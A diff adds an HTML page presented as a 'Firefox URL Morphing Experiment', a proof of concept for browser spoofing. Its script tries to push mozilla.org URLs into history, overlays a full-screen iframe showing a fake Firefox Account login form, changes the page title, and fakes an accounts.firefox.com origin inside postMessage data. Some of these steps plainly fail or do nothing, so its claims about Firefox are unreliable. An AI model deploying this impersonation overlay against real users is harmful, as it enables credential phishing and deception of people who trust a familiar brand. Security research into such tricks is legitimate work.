@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Firefox Quantum Test</title>
+    <style>
+        .url-display {
+            font-family: monospace;
+            background: #f0f0f0;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 4px;
+            transition: all 0.5s;
+        }
+    </style>
+</head>
+<body>
+
+<h1>🔗 Firefox URL Morphing Experiment</h1>
+
+<div class="url-display" id="urlDisplay">https://mozilla.org/security-test</div>
+
+<button onclick="startMorphing()">Start URL Morphing</button>
+<button onclick="testOriginSpoof()">Test Origin Spoofing</button>
+
+<div id="log"></div>
+
+<script>
+function log(msg) {
+    document.getElementById('log').innerHTML += `<div>${new Date().toLocaleTimeString()}: ${msg}</div>`;
+}
+
+function startMorphing() {
+    log('🚀 Starting URL morphing sequence...');
+    
+    // Firefox-specific URL manipulation techniques
+    const morphStages = [
+        {
+            title: "Stage 1: Push State with Legit URL",
+            action: () => {
+                history.pushState({trusted: true}, "Mozilla Foundation", "https://foundation.mozilla.org/");
+                updateURLDisplay();
+                log('Pushed: foundation.mozilla.org');
+            }
+        },
+        {
+            title: "Stage 2: Add Hash Fragment",
+            action: () => {
+                history.pushState({}, "Login", "#/login?service=firefox-accounts");
+                updateURLDisplay();
+                log('Added hash fragment');
+            }
+        },
+        {
+            title: "Stage 3: Data URL Transition",
+            action: () => {
+                // Firefox handles data URLs differently
+                const dataURL = `data:text/html;base64,${btoa(`
+                    <!DOCTYPE html>
+                    <html>
+                    <head><title>Firefox Accounts</title></head>
+                    <body style="padding:40px;font-family:Arial;">
+                        <h2 style="color:#000">🔐 Firefox Account Login</h2>
+                        <p>Please sign in to continue</p>
+                        <input type="email" placeholder="Email" style="padding:10px;margin:5px;">
+                        <input type="password" placeholder="Password" style="padding:10px;margin:5px;">
+                    </body>
+                    </html>
+                `)}`;
+                
+                // Try to manipulate via iframe
+                const iframe = document.createElement('iframe');
+                iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:9999';
+                iframe.src = dataURL;
+                document.body.appendChild(iframe);
+                
+                log('Loaded data URL in iframe');
+            }
+        },
+        {
+            title: "Stage 4: about:reader Manipulation",
+            action: () => {
+                // Firefox's about:reader mode can sometimes be triggered
+                try {
+                    // This might trigger reader view in some contexts
+                    document.body.setAttribute('moz-reader', 'true');
+                    document.title = "About Firefox Security | Mozilla";
+                    log('Attempted reader mode trigger');
+                } catch(e) {
+                    log('Reader mode not available: ' + e.message);
+                }
+            }
+        }
+    ];
+    
+    // Execute stages with delays
+    morphStages.forEach((stage, index) => {
+        setTimeout(() => {
+            log(`\n${stage.title}`);
+            try {
+                stage.action();
+            } catch(e) {
+                log('Error: ' + e.message);
+            }
+        }, index * 2000);
+    });
+}
+
+function testOriginSpoof() {
+    log('\n🔍 Testing Origin Spoofing Techniques...');
+    
+    // Technique 1: postMessage origin spoofing
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.srcdoc = `
+        <!DOCTYPE html>
+        <html>
+        <script>
+            // Try to spoof origin in postMessage
+            window.addEventListener('message', function(e) {
+                // Firefox might not properly validate origin in some cases
+                if(e.data === 'getOrigin') {
+                    e.source.postMessage({
+                        origin: 'https://accounts.firefox.com',
+                        data: 'spoofed'
+                    }, '*'); // Wildcard origin
+                }
+            });
+        <\/script>
+        </html>
+    `;
+    document.body.appendChild(iframe);
+    
+    // Send message to iframe
+    setTimeout(() => {
+        iframe.contentWindow.postMessage('getOrigin', '*');
+        
+        // Listen for response
+        window.addEventListener('message', (e) => {
+            if(e.data && e.data.origin) {
+                log(`Received message from origin: ${e.data.origin}`);
+                log(`Actual origin: ${e.origin}`);
+            }
+        });
+    }, 500);
+    
+    // Technique 2: document.domain manipulation (legacy)
+    try {
+        if(document.domain) {
+            log(`Current domain: ${document.domain}`);
+            // In older Firefox, this could be set to parent domain
+        }
+    } catch(e) {
+        log('document.domain manipulation blocked');
+    }
+}
+
+function updateURLDisplay() {
+    document.getElementById('urlDisplay').textContent = 
+        `Current URL: ${window.location.href}`;
+}
+
+// Monitor URL changes
+let lastURL = window.location.href;
+setInterval(() => {
+    if(window.location.href !== lastURL) {
+        log(`URL changed to: ${window.location.href}`);
+        lastURL = window.location.href;
+        updateURLDisplay();
+    }
+}, 500);
+</script>
+
+</body>
+</html>
